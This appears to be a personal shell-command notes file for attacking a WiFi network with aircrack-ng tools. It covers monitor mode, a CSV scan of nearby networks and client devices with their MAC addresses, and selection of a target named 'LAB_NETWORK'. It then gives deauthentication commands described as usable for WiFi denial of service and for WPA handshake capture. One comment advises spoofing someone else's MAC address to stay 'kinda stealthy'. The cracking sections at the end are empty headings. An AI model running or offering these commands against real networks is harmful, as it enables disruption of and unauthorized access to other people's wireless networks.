#LINKS:
#https://www.aircrack-ng.org/doku.php?id=airmon-ng
#https://www.aircrack-ng.org/doku.php?id=airodump-ng
#https://www.aircrack-ng.org/doku.php?id=deauthentication
#https://www.aircrack-ng.org/doku.php?id=cracking_wpa


#====RUNTIME REQUIREMENTS====

#RUN AS ROOT
sudo su


#====INTERFACE SCANNING====

#GATHER NETWORK DEVICES
lshw -class network -quiet -json

#SELECT NETWORK DEVICE, THIS CASE BEING WLAN1
wlan_device="wlan1"
#note that certain devices may name themselves as wlanXmon depending on situation


#====WIFI SCANNING====

#ACTIVATE WLAN_DEVICE IN MONITORING MODE
airmon-ng start $wlan_device

#OPTIONAL TO CONSIDER KILLING OTHER INTERFERING PROCESS
airmon-ng check kill
airmon-ng start $wlan_device

#TO RESTART (PROBABLE) KILLED NETWORK SERVICES
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service

#SCAN NETWORK AND DUMP INTO .CSV FILE
sample_tempfilename = "2022-10-29-17-08-00" #name format = yyyy-mm-dd-hh-mm-ss.csv
airodump-ng $wlan_device --update 1 -w $sample_tempfilename -o csv

#Better to execute command on a countdown then end subprocess afterwards.

#Using the dumped .csv file, read the file and let the user choose which
#WiFi network to target then return its ESSID/SSID, BSSID/MAC-Address, Power, and Channel

: '
SAMPLE .CSV OUTPUT
NOTE: Details have been redacted for security purposes

BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
16:27:F5:D0:E9:7A, 2022-10-29 17:50:25, 2022-10-29 17:51:45,  5, 360, WPA2, CCMP, PSK, -81,       54,        0,   0.  0.  0.  0,   0, , 
10:27:F5:D0:E9:7A, 2022-10-29 17:50:25, 2022-10-29 17:51:45,  5, 360, WPA2, CCMP, PSK, -80,       50,        0,   0.  0.  0.  0,   3, ***, 
78:98:E8:03:3E:22, 2022-10-29 17:50:26, 2022-10-29 17:51:47,  1, 130, WPA2, CCMP, PSK, -61,      214,        0,   0.  0.  0.  0,  21, *********************, 
7C:2E:BD:7C:50:DC, 2022-10-29 17:50:26, 2022-10-29 17:51:46,  1, 130, WPA2, CCMP, PSK, -84,       48,        0,   0.  0.  0.  0,   9, **********, 
7C:2E:BD:7C:55:E3, 2022-10-29 17:50:26, 2022-10-29 17:51:47,  1, 130, WPA2, CCMP, PSK, -83,       50,        2,   0.  0.  0.  0,   9, **********, 
08:86:3B:30:8B:AC, 2022-10-29 17:50:26, 2022-10-29 17:51:46,  1, 135, WPA2, CCMP, PSK, -83,       19,        0,   0.  0.  0.  0,  10, **********, 
7A:98:E8:03:3E:22, 2022-10-29 17:50:26, 2022-10-29 17:51:46,  1, 130, WPA2, CCMP, PSK, -55,      204,        0,   0.  0.  0.  0,   0, , 
78:98:E8:03:3E:1A, 2022-10-29 17:50:26, 2022-10-29 17:51:47, 13, 130, WPA2, CCMP, PSK, -68,       89,      380,   0.  0.  0.  0,  21, *********************, 
7A:98:E8:03:3E:1A, 2022-10-29 17:50:26, 2022-10-29 17:51:47, 13, 270, WPA2, CCMP, PSK, -62,       91,        0,   0.  0.  0.  0,   0, , 
AC:84:C6:94:DA:08, 2022-10-29 17:50:26, 2022-10-29 17:51:47,  2, 270, WPA2, CCMP, PSK, -68,       83,      266,   0.  0.  0.  0,  11, LAB_NETWORK, 
84:06:FA:F7:1D:90, 2022-10-29 17:50:28, 2022-10-29 17:51:45,  5, 270, WPA2 WPA, CCMP, PSK, -76,       46,        6,   0.  0.  0.  0,  10, **********, 
10:27:F5:D0:DE:96, 2022-10-29 17:50:33, 2022-10-29 17:51:45,  5, 360, WPA2, CCMP, PSK, -70,        3,        9,   0.  0.  0.  0,   3, ***, 
EC:43:F6:30:3D:58, 2022-10-29 17:50:36, 2022-10-29 17:51:38, 11,  -1, WPA, ,   ,  -1,        0,       11,   0.  0.  0.  0,   0, , 
16:27:F5:D0:DE:96, 2022-10-29 17:51:10, 2022-10-29 17:51:37,  4,  -1, WPA, ,   , -72,        0,       18,   0.  0.  0.  0,   0, , 
B0:95:75:A7:A2:A2, 2022-10-29 17:51:47, 2022-10-29 17:51:47,  8, 360, WPA2, CCMP TKIP, PSK, -89,        1,        0,   0.  0.  0.  0,  16, ****************, 
B6:95:75:A7:A2:A2, 2022-10-29 17:51:47, 2022-10-29 17:51:47,  8, 360, WPA2, CCMP, PSK, -89,        1,        0,   0.  0.  0.  0,   0, , 

Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
66:AF:DE:0E:E7:D5, 2022-10-29 17:50:28, 2022-10-29 17:51:37, -84,       17, 84:06:FA:F7:1D:90,
C4:93:D9:37:A8:27, 2022-10-29 17:50:29, 2022-10-29 17:51:29, -90,        9, (not associated) ,
B0:6F:E0:77:6D:5A, 2022-10-29 17:50:31, 2022-10-29 17:50:31, -46,        4, (not associated) ,
E2:17:0B:49:30:CD, 2022-10-29 17:50:33, 2022-10-29 17:51:47, -82,       45, 7C:2E:BD:7C:55:E3,
98:B0:8B:33:8D:78, 2022-10-29 17:50:34, 2022-10-29 17:51:47, -46,       90, (not associated) ,
08:EA:40:E3:A4:87, 2022-10-29 17:50:36, 2022-10-29 17:51:18, -82,       17, EC:43:F6:30:3D:58,
2C:FD:A1:51:86:DA, 2022-10-29 17:50:49, 2022-10-29 17:51:43, -90,      378, 78:98:E8:03:3E:1A,
40:AA:56:39:1A:E3, 2022-10-29 17:50:52, 2022-10-29 17:50:52, -88,        1, EC:43:F6:30:3D:58,
B4:CB:57:5D:3F:6B, 2022-10-29 17:50:55, 2022-10-29 17:51:38, -88,        2, EC:43:F6:30:3D:58,
10:63:C8:5F:57:11, 2022-10-29 17:51:08, 2022-10-29 17:51:38, -28,        3, (not associated) ,
7A:88:23:0A:A2:B9, 2022-10-29 17:51:19, 2022-10-29 17:51:19, -90,        4, 08:86:3B:30:8B:AC,
A2:C1:00:1D:D5:21, 2022-10-29 17:51:28, 2022-10-29 17:51:42, -46,      410, AC:84:C6:94:DA:08,LAB_NETWORK
'

#ASSUME A TARGET HAS BEEN SELECTED
#The ff variables must be also available on actual python script
target_essid = "LAB_NETWORK"
target_bssid = "AC:84:C6:94:DA:08"
target_channel = "6" #to parse as int when needed but used as str most of the time
wlan_mac = "F4:28:53:14:88:3B" #mac address of wlan_device
wlan_logical = "wlan1"
host_mac = "A4:FF:12:14:90:B3"


#====DEAUTH ATTACK====

#This command can be used for both handshake capture and WiFi DOS attack.

#This command deauths all devices continously.
aireplay-ng -0 0 -a $target_bssid $wlan_logical #NOISY

#This command deauths specific device continously.
#You'd wanna use someone else's or your other device's 
#MAC address who's able to connect already.
aireplay-ng -0 0 -a $target_bssid -c $host_mac $wlan_logical #KINDA STEALTHY


#====HANDSHAKE CAPTURE====

#EXECUTE HANDSHAKE CAPTURE
airodump-ng -c $target_channel --bssid $target_bssid --update 1 -w capture $wlan_device

#It is optional to execute deauth attack simultaneously or just after handshake capture began
#since the term 'handshake capture' implies that it must catch attempts of other hosts to 
#connect to the target WiFi network.

#====WPA CRACKING VIA DICTIONARY====


#====WPA CRACKING VIA BRUTEFORCE====


#====WPS CRACKING====